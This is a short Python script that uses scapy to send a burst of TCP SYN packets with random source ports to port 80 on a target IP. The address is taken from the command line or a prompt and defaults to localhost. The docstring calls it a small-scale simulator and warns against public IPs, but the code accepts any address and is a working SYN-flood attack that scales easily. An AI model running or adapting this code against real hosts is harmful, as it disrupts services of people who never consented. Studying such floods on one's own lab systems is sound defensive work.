# simulate_syn.py
"""
SYN flood simulator (small scale).
- Accepts target IP via CLI arg or prompt.
- Sends multiple SYN packets to target port 80 by default.
SAFETY: Don't run against public IPs.
"""

import sys
import random
import time
from scapy.all import IP, TCP, send

def get_target(default="127.0.0.1"):
    if len(sys.argv) > 1:
        return sys.argv[1]
    t = input(f"Target IP for SYN flood (default {default}): ").strip()
    return t if t else default

def main():
    target = get_target()
    print("Simulating small SYN flood against", target)
    try:
        for _ in range(120):
            sport = random.randint(1024, 65535)
            pkt = IP(dst=target)/TCP(sport=sport, dport=80, flags="S")
            send(pkt, verbose=False)
            time.sleep(0.01)
        print("SYN flood simulation complete.")
    except PermissionError:
        print("Permission error: run with admin privileges or test on loopback.")
    except Exception as e:
        print("Error during SYN flood:", e)

if __name__ == "__main__":
    main()
